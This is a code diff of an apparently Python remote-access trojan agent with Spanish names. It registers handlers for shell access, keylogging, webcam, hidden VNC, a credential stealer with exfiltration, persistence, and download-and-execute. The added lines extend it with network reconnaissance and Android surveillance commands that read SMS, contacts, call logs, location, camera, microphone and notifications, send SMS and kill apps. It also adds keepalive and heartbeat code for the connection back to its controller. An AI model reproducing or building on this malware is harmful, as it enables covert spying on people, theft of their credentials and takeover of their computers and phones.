+    pkg = a.get("paquete", "")
+    return {"salida": _root_cmd(
+        f"monkey -p {pkg} -c android.intent.category.LAUNCHER 1", timeout=25)}
+
+
+def _movil_app_matar(a):
+    return {"salida": _root_cmd(f"am force-stop {a.get('paquete', '')}", timeout=25)}
+
+
+def _movil_root(a):
+    r = _es_root_android()
+    return {"root": r, "salida": _root_cmd("id") if r else "sin root"}
+
+
+def _movil_persistir(a):
+    return _persistir(a)
+
+
+# ===========================================================================
+#  Registro de handlers
+# ===========================================================================
 HANDLERS = {
     "ping": _ping, "shell": _shell, "sysinfo": lambda a: _sysinfo(),
     "listar_dir": _listar_dir, "procesos": _procesos, "captura": _captura,
-    "raton": _raton, "swap_raton": _swap_raton, "teclado": _teclado, "webcam": _webcam,
-    "webcam_iniciar": _webcam_iniciar, "webcam_frame": _webcam_frame, "webcam_parar": _webcam_parar,
+    "raton": _raton, "swap_raton": _swap_raton, "teclado": _teclado,
+    "webcam": _webcam, "webcam_iniciar": _webcam_iniciar,
+    "webcam_frame": _webcam_frame, "webcam_parar": _webcam_parar,
     "keylogger_iniciar": _keylogger_iniciar, "keylogger_leer": _keylogger_leer,
-    "persistir": _persistir_avanzado, "abrir_url": _abrir_url, "mensaje": _mensaje,
+    "persistir": _persistir, "abrir_url": _abrir_url, "mensaje": _mensaje,
     "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
     "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
-    "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar, "hvnc_navegar": _hvnc_navegar,
-    "hvnc_estado": _hvnc_estado, "hvnc_opciones": _hvnc_opciones, "log": _log_leer,
-    "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton, "hvnc_teclado": _hvnc_teclado,
-    "hvnc_stream": _hvnc_stream, "captura_stream": _captura_stream,
-    "bloquear_entrada": _bloquear, "clip_get": _clip_get, "clip_set": _clip_set,
-    "desconectar": _desconectar,
+    "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar,
+    "hvnc_navegar": _hvnc_navegar, "hvnc_estado": _hvnc_estado,
+    "hvnc_opciones": _hvnc_opciones, "log": _log_leer,
+    "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton,
+    "hvnc_teclado": _hvnc_teclado, "hvnc_stream": _hvnc_stream,
+    "captura_stream": _captura_stream, "bloquear_entrada": _bloquear,
+    "clip_get": _clip_get, "clip_set": _clip_set, "desconectar": _desconectar,
     "stealer_recolectar": _stealer_recolectar, "stealer_estado": _stealer_estado,
     "stealer_paquete": _stealer_paquete, "stealer_exfil": _stealer_exfil,
     "stealer_auto": _stealer_auto,
+    "whoami": _whoami, "netstat": _netstat, "arp": _arp, "ipconfig": _ipconfig,
+    "tasklist": _tasklist, "net_user": _net_user, "net_view": _net_view,
+    "schtasks_list": _schtasks_list, "drives": _drives, "env": _env, "wmi": _wmi,
+    "powershell": _powershell, "spawn": _spawn, "portscan": _portscan,
+    "energia": _energia, "recon_full": _recon_full,
+    "wifi_perfiles": _wifi_perfiles, "privilegios": _privilegios,
+    "beacon_kill": _beacon_kill, "beacon_reconectar": _beacon_reconectar,
+    "caps": lambda a: {"so": SO, "caps": CAPS},
+    # --- movil (Android / Termux) ---
+    "movil_info": _movil_info, "movil_pantalla": _movil_pantalla,
+    "movil_tap": _movil_tap, "movil_swipe": _movil_swipe,
+    "movil_texto": _movil_texto, "movil_tecla": _movil_tecla,
+    "movil_camara": _movil_camara, "movil_mic": _movil_mic,
+    "movil_sms": _movil_sms, "movil_sms_enviar": _movil_sms_enviar,
+    "movil_contactos": _movil_contactos, "movil_llamadas": _movil_llamadas,
+    "movil_ubicacion": _movil_ubicacion, "movil_sensores": _movil_sensores,
+    "movil_bateria": _movil_bateria, "movil_almacenamiento": _movil_almacenamiento,
+    "movil_wifi": _movil_wifi, "movil_wifi_scan": _movil_wifi_scan,
+    "movil_telefonia": _movil_telefonia, "movil_procesos": _movil_procesos,
+    "movil_cuentas": _movil_cuentas, "movil_notif_list": _movil_notif_list,
+    "movil_clip_get": _movil_clip_get, "movil_clip_set": _movil_clip_set,
+    "movil_notificar": _movil_notificar, "movil_toast": _movil_toast,
+    "movil_tts": _movil_tts, "movil_vibrar": _movil_vibrar,
+    "movil_linterna": _movil_linterna, "movil_fondo": _movil_fondo,
+    "movil_huella": _movil_huella, "movil_dialogo": _movil_dialogo,
+    "movil_media": _movil_media, "movil_volumen": _movil_volumen,
+    "movil_apps": _movil_apps, "movil_app_abrir": _movil_app_abrir,
+    "movil_app_matar": _movil_app_matar, "movil_root": _movil_root,
+    "movil_persistir": _movil_persistir,
 }
 
 _RUIDO = ("ping", "raton", "teclado", "hvnc_captura", "hvnc_raton",
           "hvnc_teclado", "hvnc_stream", "captura_stream", "webcam_frame",
-          "captura", "hvnc_estado")
+          "captura", "hvnc_estado", "movil_pantalla")
 
 
 def _bucle(sock):
@@ -2805,7 +4247,8 @@ def _bucle(sock):
             _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": True, "datos": datos})
         except Exception as e:
             _log("ERROR", f"{cmd}: {e}")
-            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False, "error": str(e)})
+            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False,
+                           "error": str(e)})
         if _SALIR:
             os._exit(0)
 
@@ -2815,7 +4258,14 @@ def _intentar(h, puerto, timeout):
         s = socket.create_connection((h, puerto), timeout=timeout)
         s.settimeout(None)
         try:
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)   # <- fluidez
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        except Exception:
+            pass
+        try:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
         except Exception:
             pass
         return s
@@ -2855,7 +4305,7 @@ def main():
     for h in (host, fb, "127.0.0.1"):
         if h and h not in objetivos:
             objetivos.append(h)
-    _log("AGENTE", f"inicio pid={os.getpid()} objetivos={objetivos} puerto={puerto}")
+    _log("AGENTE", f"inicio pid={os.getpid()} so={SO} caps={sorted(CAPS)}")
     while True:
         s = _conectar(objetivos, puerto, timeout=5.0)
         if s is not None:
@@ -2863,6 +4313,7 @@ def main():
             try:
                 _enviar(s, {"tipo": "hola", "info": _sysinfo()})
                 _log("AGENTE", "conectado al controlador")
+                threading.Thread(target=_hilo_latido, args=(s,), daemon=True).start()
                 _bucle(s)
                 _log("AGENTE", "desconectado")
             except SystemExit:
